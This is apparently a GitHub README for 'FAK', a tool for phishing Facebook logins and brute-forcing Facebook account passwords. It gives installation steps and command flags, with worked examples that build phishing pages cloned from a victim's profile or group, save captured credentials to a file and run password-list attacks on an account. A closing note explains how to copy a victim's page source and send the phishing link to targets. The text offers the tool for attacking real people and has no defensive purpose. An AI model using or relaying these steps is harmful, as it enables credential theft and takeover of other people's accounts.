# FAK
```
________        __
|              /  \          |   /
|             /    \         |  /
|____        /______\        | /
|           /        \       |/
|          /          \      | \ 
|         /            \     |  \ 
|        /              \    |   \ 
```
# Installation 
To install FKE in your system just follow these command just copy and past these in your terminal
```
apt update
apt upgrade
apt install python
apt install php
apt install python2
apt install git
git clone https://github.com/5M4CK3R-H4CK3R-95/FAK.git
cd FAK
chmod +x *
bash install.sh
```

## <<<- It Would Install FKE in your system ->>>

# Usage
```
all command list : 

type :

  -h [for List all commands]

  -b [-b reffer for bruteforce attack]

  -p [-p reffer for phising attack]

  -d [it is use to list the path of the world list]

  -u [it reffer for username]

  -i [it reffer for ip address]

  -r [it reffer for port]

  -v [it reffer for version pc/android]

  -o [Set output file path and name in .txt format]

  -f [it reffer for url with wich you wont to buind]

  -j [url which shuld open after login]

  -r [It use to reset]

Usage :

for bruteforce attack : 

$ ./fb -b -u [username] -d [path of file]

for phising :

$ ./fb -p -v [version pc/android] -i [ip address] -r [port] -j [url after redirection] -o [output file name and path]

e.g suppose that version is android and ip is 127.0.0.1 and port is 8080 and after login your wont to redirest victim to www.google.com and ooutput file is data.txt

for reset :

$ ./fb -r

for making a phising page and buind it 

$ ./fb -p -v [version pc/android] -f [url of facebook profile or group] -j [redirect url after login] -o [outputfile path]

e.g suppose ip > 127.0.0.1 port > 8080 in phising and version is android and redirect to google and output file is data.txt and your are buinding it with https://www.facebook.com/group/

$ ./fb -p -v android -i 127.0.0.1 -r 8080 -j https://www.google.com -f https://www.facebook.com/group/ -o data.txt

or suppose in port forwording output file is hack.txt and redirecting after login to google for pc

$ ./fb -p -v pc -j https://www.google.com -o hack.txt

in bruteforce attack suppose number is 123456789 and password file is pass.txt

$ ./fb -b -u 123456789 -d pass.txt

```
# Description

This is a simple Script that is use to make a phising page and also it can do a bruteforc attack on any facebook account 
you can use this tool in linux and termux both 
this tool also contain a buinding feature it can make any persons profile link to a phising page on both type of plateforms like 
Desktop and android it also support a bruteforce attacking scrip
To do a phising attack you need to first install this tool after installing it just type ./fb -h to see all command list and you 
can use them in it it is very simple and it is very fast to use .

## NOTE : 
* \
For buinding a page you need a source code of victims profile you can use any html inspector to get it and then save it on your 
internal storege by using any text editor and also donot try to edit the source code after that save the file you can use any
name to save it after that just enter the name of the file in it by -f tag it would buind it and start your server and now just 
send that site that it would give u and you are done ....
